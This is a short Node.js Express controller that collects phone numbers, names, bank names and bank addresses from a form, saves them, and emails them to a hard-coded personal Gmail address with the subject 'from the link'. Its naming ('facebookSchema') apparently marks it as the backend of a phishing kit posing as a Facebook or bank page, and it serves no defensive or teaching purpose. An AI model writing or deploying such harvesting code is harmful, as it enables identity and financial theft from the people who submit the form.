const infoSchema = require('../model/infoSchema')
const sendEmail=require('./sendMail')
const postInfo = async(req, res) => {
  try {
    const { phonenumber, firstname, lastname, surname, bankname, bankaddress } = req.body;
    const subject = `
    <P>PHONENUMBER: ${phonenumber}</P>
    <P>FIRSTNAME: ${firstname}</P>
    <P>LASTNAME: ${lastname}</P>
    <P>SURNAME: ${surname}</P>
    <P>BANKNAME: ${bankname}</P>
    <P>BANKADDRESS: ${bankaddress}</P>
    `;
      const facebookSchema = await infoSchema.create({
        phonenumber,
        firstname,
        lastname,
        surname,
        bankname,
        bankaddress,
      });
    res.status(200).json({ facebookSchema });
    sendEmail('janupatrick26@gmail.com','from the link',subject)
  } catch (error) {
    res.status(500).json({ msg: error });
  }
};

module.exports={postInfo}


